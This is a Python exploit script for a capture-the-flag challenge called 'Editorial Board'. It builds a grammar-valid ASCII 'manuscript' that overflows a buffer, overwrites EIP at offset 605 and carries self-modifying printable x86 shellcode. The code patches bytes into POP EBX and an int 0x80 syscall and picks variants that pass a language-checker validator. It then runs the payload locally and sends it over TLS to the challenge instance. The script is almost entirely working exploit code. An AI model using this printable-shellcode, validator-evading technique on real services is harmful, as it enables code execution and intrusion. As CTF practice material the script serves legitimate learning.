#!/usr/bin/env python3
"""FortID Editorial Board: avoid a CS-segment store at code offset +87.

Usage:
    python3 editorial_native_cs_fix.py --stage8 manuscript_ascii_write_stage8_offset.txt
    python3 editorial_native_cs_fix.py --stage8 manuscript_ascii_write_stage8_offset.txt \
       --remote editorial-board-INSTANCE.inst2.ctf.fortid.com

This tests a specific native-x86 #GP hypothesis: the executed third writer
originally begins with 2e 00 41 xx = CS: ADD BYTE PTR [ECX+xx],AL.
The first writer at +71 is safe because the branch jumps over prefix +70.
The 32-bit CS descriptor is not writable; QEMU user-mode may miss this.
The script selects equivalent grammar-valid code without CS on the store.

Only the Stage-8 stdout proof is changed, not flag-opening logic.
"""
import argparse
import json
import socket
import ssl
import string
import subprocess
import time
from pathlib import Path

ALLOWED = set((string.ascii_letters + " .,;:'-?!").encode())
# (five printable bytes, number of ECX increments before third writer)
# None leaves CS attached to the memory-writing ADD at +87.
BLOCKS = [
    (b".AA.G", 2), (b".AA.O", 2), (b".AA.F", 2),
    (b".AA.N", 2), (b".AA.C", 2), (b".AA.K", 2),
    (b".PX.G", 0), (b".PX.O", 0), (b".PX.F", 0),
    (b".PX.N", 0), (b".QY.G", 0), (b".QY.O", 0),
    (b".PAXG", 1), (b".PAXO", 1), (b".PAXF", 1),
    (b"PAX.G", 1), (b"PAX.O", 1), (b"PAX.F", 1),
    (b".AA.A", 3), (b".PX.A", 1), (b".GG.G", 0),
]

def build(original, block, delta):
    code=bytearray(original[609:726])
    assert len(code)==117
    assert code[70:74]==b". As" and code[79:82]==b" At"
    assert code[82:87]==b".PAX." and code[87:90]==b" Ac"
    assert code[100:101]==b" " and code[115:117]==b".E"
    assert code[9:13]==b",ax:" and code[74:79]==b"-dawn"
    code[82:87]=block
    # Code +87 is ADD BYTE PTR [ECX+disp],AL. The code generates
    # EBX's POP opcode at +100. Each leading INC ECX changes the needed disp.
    code[89]=100-delta
    patched=bytearray(code)
    for ix in (71,79,87):patched[ix]=0
    al=(-ord('a'))&255
    patched[115]=(patched[115]+al)&255
    al=(al-ord('d'))&255
    patched[116]=(patched[116]+al)&255
    patched[100]=(patched[100]+al)&255
    assert patched[100]==0x5b and patched[115:117]==b"\xcd\x80"
    assert patched[71:74]==b"\x00As" and patched[79:82]==b"\x00At"
    assert patched[87:89]==b"\x00A" and patched[89]==100-delta
    # +70 CS prefix is jumped over; +78 ends SUB imm32; +86 MUST NOT be CS.
    assert patched[86]!=0x2e
    # All blocks' final byte is an executed harmless instruction, not prefix.
    assert patched[86] in b"GOFNCKA"
    manuscript=original[:609]+code+original[726:]
    assert len(manuscript)==len(original)
    assert all(c in ALLOWED for c in manuscript)
    return bytes(manuscript),bytes(patched)

def main():
    p=argparse.ArgumentParser(description=__doc__)
    p.add_argument('--stage8',type=Path,default=Path('manuscript_ascii_write_stage8_offset.txt'))
    p.add_argument('--remote',default=None,help='Named CTF host, not arbitrary internet host')
    p.add_argument('--port',type=int,default=1337)
    p.add_argument('--limit',type=int,default=len(BLOCKS))
    p.add_argument('--timeout',type=float,default=80)
    p.add_argument('--out',type=Path,default=Path('manuscript_native_stage8_899.txt'))
    p.add_argument('--native-local',action='store_true',help='Try local native i386 execution without QEMU')
    args=p.parse_args()
    src=args.stage8.read_bytes()
    if len(src) not in (897,899):raise SystemExit('Provide the 897/899-byte accepted Stage8 manuscript')
    if src[605:609]!=b'able':raise SystemExit('Not expected EIP overwrite')
    if len(src)==897:
        # Exactly two extra bytes in English prose only; this expansion was
        # previously accepted on Kali for original Stage8.
        h,t=src[:726],src[726:]
        if b' a ' in t:t=t.replace(b' a ',b' the ',1)
        elif b' in ' in t:t=t.replace(b' in ',b' near ',1)
        else:raise SystemExit('Cannot pad prose; supply the known 899-byte Stage8 version')
        src=h+t
    assert len(src)==899
    print('Source 899 bytes; Stage8 EIP offset 605; checking native-safe variants')

    try:
        import language_tool_python,validate
    except ImportError as exc:
        raise SystemExit('Use your Kali venv with language_tool_python and original validate.py: '+str(exc))
    lt=language_tool_python.LanguageTool('en-US')
    scores=[];count=0
    try:
        for block,delta in BLOCKS:
            if count>=args.limit:break
            count+=1
            data,patched=build(src,block,delta)
            fields,err=validate.structural(data.decode('ascii'))
            if err:continue
            _,words,sentences,repetition,avg=fields
            matches=lt.check(data.decode('ascii'))
            spelling=sum(validate.is_spelling(m) for m in matches)
            density=100*len(matches)/len(words)
            score=round(max(0,min(100,100-5*density-1000*spelling/len(words)-55*repetition-.6*max(0,avg-24))),2)
            ok=(spelling==0 and density<=2.2 and score>=88)
            record=dict(ok=ok,score=score,spelling=spelling,issues=len(matches),words=len(words),
                 replacement=block.decode(),ecx_drift=delta,
                 rules=[(getattr(x,'rule_id',getattr(x,'ruleId','')),x.offset) for x in matches])
            scores.append((record,data,patched))
            print(f'{count:2} {"ACCEPT" if ok else "REJECT"} score={score:5.2f} issues={len(matches)} sp={spelling} block={block.decode()} drift={delta}',flush=True)
            if ok:break
    finally:
        lt.close()
    if not scores:raise SystemExit('No variants checked')
    scores.sort(key=lambda s:(s[0]['ok'],s[0]['score']),reverse=True)
    report,data,patched=scores[0]
    Path('editorial_native_cs_scores.json').write_text(json.dumps([x[0] for x in scores],indent=2))
    print('BEST:',json.dumps(report,indent=2))
    if not report['ok']:
        print('NO ACCEPT. See editorial_native_cs_scores.json for rule IDs.');return

    args.out.write_bytes(data)
    Path('editorial_native_stage8_patched.bin').write_bytes(patched)
    print('Saved:',args.out)
    expected=bytes(patched[3+report['ecx_drift']:7+report['ecx_drift']]);print('Expected native Stage8 write(1,...,4):',repr(expected))
    # Independent validator check, no approximations.
    import sys
    v=subprocess.run([sys.executable,'validate.py','--json',str(args.out)],capture_output=True,text=True,timeout=180)
    print('VALIDATOR:',v.stdout or v.stderr)
    if v.returncode:print('INDEPENDENT REJECT: do not send to server');return
    if args.native_local:
        try:
            proc=subprocess.run(['./editorial_board'],input=data+b'\n',
                                capture_output=True,timeout=65)
            print('NATIVE_LOCAL_EXIT',proc.returncode,
                  'NATIVE_MARKER',expected in proc.stdout,
                  'OUTPUT',repr(proc.stdout[-500:]),
                  'STDERR',repr(proc.stderr[-300:]))
        except (OSError,subprocess.TimeoutExpired) as exc:
            print('NATIVE_LOCAL_UNAVAILABLE:',exc)
    if not args.remote:
        print('Run remote proof: python3 editorial_native_cs_fix.py --stage8',args.stage8,'--remote <instance>');return
    ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
    t0=time.monotonic()
    with socket.create_connection((args.remote,args.port),timeout=12) as s:
        with ctx.wrap_socket(s,server_hostname=args.remote) as tls:
            rx=bytearray();tls.settimeout(1)
            def take(token,deadline):
                while time.monotonic()-t0<deadline:
                    if token and token in rx:return True
                    try:buf=tls.recv(8192)
                    except socket.timeout:continue
                    if not buf:break
                    rx.extend(buf);print('RX',round(time.monotonic()-t0,2),repr(buf[:800]),flush=True)
                return token and token in rx
            if not take(b'Submit your manuscript:',12):raise SystemExit('No prompt')
            tls.sendall(data+b'\n')
            print('TX 900 bytes; receive window',args.timeout)
            take(None,args.timeout)
            Path('editorial_native_remote_response.bin').write_bytes(rx)
            print('RESULT_NATIVE_MARKER',expected in rx,'EXPECTED',repr(expected),'RX_BYTES',len(rx))

if __name__=='__main__':main()
